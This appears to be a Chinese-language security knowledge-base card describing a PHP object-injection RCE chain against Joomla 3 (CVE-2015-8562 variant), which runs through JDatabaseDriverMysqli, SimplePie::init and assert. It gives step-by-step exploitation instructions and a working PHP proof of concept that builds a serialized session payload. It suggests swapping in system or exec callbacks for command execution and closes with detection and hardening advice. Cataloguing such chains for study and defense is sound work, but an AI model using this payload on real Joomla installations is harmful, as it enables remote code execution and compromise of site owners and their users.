---
id: web-php-deserialization-joomla3-mysqli-simplepie-assert-rce
title: Joomla 3 JDatabaseDriverMysqli + SimplePie 反序列化 RCE（CVE-2015-8562 变体）：disconnectHandlers 调 init 再以 assert 执行 feed_url
type: scenario
domain: web
path: web/php/deserialization
technique: joomla3-mysqli-simplepie-assert-rce
tags:
- php
- joomla
- deserialization
- rce
- simplepie
- mysqli
- assert
- cve-2015-8562
cve:
- CVE-2015-8562
severity: critical
confidence: high
affected_versions: Joomla 3.4.5（CVE-2015-8562）；3.4.6+ 需把 connection 构造成 mysqli 实例，3.4.8 实测可用（原文标记）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V371
  verified_at: '2026-11-09T05:59:05+08:00'
  notes: 已对照原文核对；图06 mysqli disconnect 的 instanceof mysqli && stat()!==false、图07 SimplePie::init 的 cache/scheme 判断与 call_user_func(cache_name_function, feed_url)、图08 parse_uri 得到 scheme=phpinfo();JFactory 的解释、图10 hehdv_session 注入后 PHP 5.6.19 phpinfo 回显均一致；3.4.5/3.4.6+/3.4.8 版本表述按原文与图注；未复跑，PHP 8 assert 不求值为卡内已注边界
url: /docs/web/php/deserialization/web-php-deserialization-joomla3-mysqli-simplepie-assert-rce/
draft: false
kb_aliases:
- Joomla 3 反序列化 RCE
- CVE-2015-8562
- JDatabaseDriverMysqli 反序列化
- SimplePie init assert
- disconnectHandlers 利用
- Joomla 3.4.8 反序列化
---

## 一句话结论

Joomla 3 的对象注入可用一条短链拿到 RCE：`JDatabaseDriverMysqli::__destruct()` 调用 `disconnect()`，在 `connection instanceof mysqli` 校验通过后遍历 `disconnectHandlers` 执行 `call_user_func_array([$simplepie,'init'], [&$db])`；`SimplePie::init()` 在 `cache=true` 且 `parse_url(feed_url)['scheme']` 非空时，用 `call_user_func($cache_name_function, $feed_url)` 把 `feed_url` 当 PHP 执行——令 `cache_name_function='assert'`、`feed_url='phpinfo();JFactory::getConfig();exit;'` 即可执行任意代码。

## 原理

- **入口 __destruct**：`JDatabaseDriverMysqli::__destruct()` 直接调用 `disconnect()`。3.4.5 中只需 `$this->connection` 为真；3.4.6 起改为 `$this->connection instanceof mysqli && $this->connection->stat() !== false`，因此在 payload 里把 `connection` 构造成 `new mysqli('','','','')` 即可通过（未连接时 `stat()` 返回 false 的细节随版本而异，原文实测该构造可用）。
- **disconnectHandlers 是函数调用点**：`disconnect()` 对 `$this->disconnectHandlers` 每一项执行 `call_user_func_array($h, array(&$this))`；把其中一项设为 `[$simplepie, 'init']`，即调用 `SimplePie::init($db)`（参数是数据库对象，不影响后续）。
- **SimplePie::init 中的 call_user_func**：`init()` 先 `$parsed_feed_url = SimplePie_Misc::parse_url($this->feed_url)`，再判断 `if ($this->cache && $parsed_feed_url['scheme'] !== '')`；条件成立时执行 `call_user_func(array($this->cache_class, 'create'), $this->cache_location, call_user_func($this->cache_name_function, $this->feed_url), 'spc')`。内层 `call_user_func` 以 `feed_url` 为参数调用 `cache_name_function`，设成 `assert` 即把 `feed_url` 字符串当代码执行（PHP 5.x/7.x 的 assert 字符串求值行为）。
- **为什么 feed_url 必须带冒号**：`parse_url('phpinfo();exit;')` 没有 scheme，`scheme === ''` 会让整个缓存分支被跳过；payload 用 `phpinfo();JFactory::getConfig();exit;`，其中 `JFactory::getConfig()` 的 `::` 让 parse_url 解析出一个非空 scheme（原文调试结果：scheme=`phpinfo();JFactory`，path=`:getConfig();exit;`），从而进入分支；前面的 `phpinfo();` 先执行，`exit;` 结束请求。
- **为什么链能成立**：`__destruct` 自动触发、`disconnectHandlers` 是可控数组、`cache_name_function` 是可控字符串都被当作回调，`assert` 又允许字符串求值；整条链不需要 `__wakeup`，是纯属性驱动的对象注入利用。

## 触发条件

- 目标为 Joomla 3.x（3.4.5 存在 CVE-2015-8562；3.4.6+ 按上文调整 `connection` 后仍可构造，原文在 3.4.8 实测）。
- 存在可控 `unserialize()` 入口（如数据库 session 表注入）。
- PHP 版本允许 `assert` 字符串求值（PHP 5.x；PHP 7 需 `zend.assertions=1`，PHP 8 的 assert 不再执行字符串）。
- 目标 classpath 含 Joomla 3 的 `JDatabaseDriverMysqli` 与 `SimplePie` 类。

## 利用步骤

1. 构造 payload：`JDatabaseDriverMysqli` 的 `$a = new JSimplepieFactory()`（占位）、`$connection = new mysqli('','','','')`、`$disconnectHandlers = [[$simplepie,'init']]`；`SimplePie` 的 `cache=true`、`cache_name_function='assert'`、`feed_url='phpinfo();JFactory::getConfig();exit;'`。
2. `serialize($obj)` 后 `base64_encode`，按 `joomla|s:N:"<base64>";` 写入 Joomla session 表（或送入其他反序列化入口）。
3. 携带原 session Cookie 请求首页，触发反序列化与 `__destruct`。
4. 观察 `phpinfo()` 输出或改用命令执行/写文件载荷；`JFactory::getConfig()` 保留以提供冒号，`exit;` 结束请求。

## PoC

```php
<?php
class JSimplepieFactory {}
class SimplePie_Sanitize {}
class SimplePie_Registry {}

class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct() {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new SimplePie_Sanitize();
        $this->registry = new SimplePie_Registry();
        $this->cache = true;
    }
}

class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct() {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = new mysqli('','','','');
        $this->disconnectHandlers = [[$x, "init"]];
    }
}

$str = base64_encode(serialize(new JDatabaseDriverMysqli()));
echo "joomla|" . serialize($str);
```

## 变体与关联

- **版本变体**：3.4.5 不需要 mysqli 实例；3.4.6+ 必须构造 `connection` 为 mysqli 实例；`feed_url` 必须带冒号（`JFactory::getConfig()` 或 `http://` 前缀均可满足 scheme 判断）。
- **回调变体**：`cache_name_function` 可换 `system`/`exec`（按 PHP 版本与 assert 限制）、`preg_replace /e` 等；也可把 `disconnectHandlers` 指向其他类的静态/实例方法。
- **入口**：本批 Joomla session 表反序列化卡；CVE-2015-8562 原始入口是 HTTP 头注入 session 数据，本文用数据库写 session 复现。
- **关联**：[[web-php-deserialization-simplepie-memcache-poisoning]]（SimplePie 反序列化入口的另一条链，机制不同）。
- **边界**：PHP 8（assert 不求值字符串）、Joomla 类名/属性变更、`disconnect()` 校验进一步加强、或对象注入入口被限制时失效。

## 检测与防御

- **升级**：Joomla 3 已停止维护，迁移到受支持版本；CVE-2015-8562 的原始入口在 3.4.6+ 修复，但对象注入本身仍需入口加固。
- **反序列化加固**：会话数据签名/加密、`allowed_classes` 白名单；禁止对数据库内容直接 `unserialize`。
- **PHP 配置**：生产环境 `zend.assertions=-1` 关闭 assert 求值，降低 assert 字符串武器化风险。
- **检测**：session 数据中出现 `JDatabaseDriverMysqli`/`SimplePie`/`assert` 等特征；Joomla 进程执行 `phpinfo()`/命令；异常对象注入后的请求结束行为。
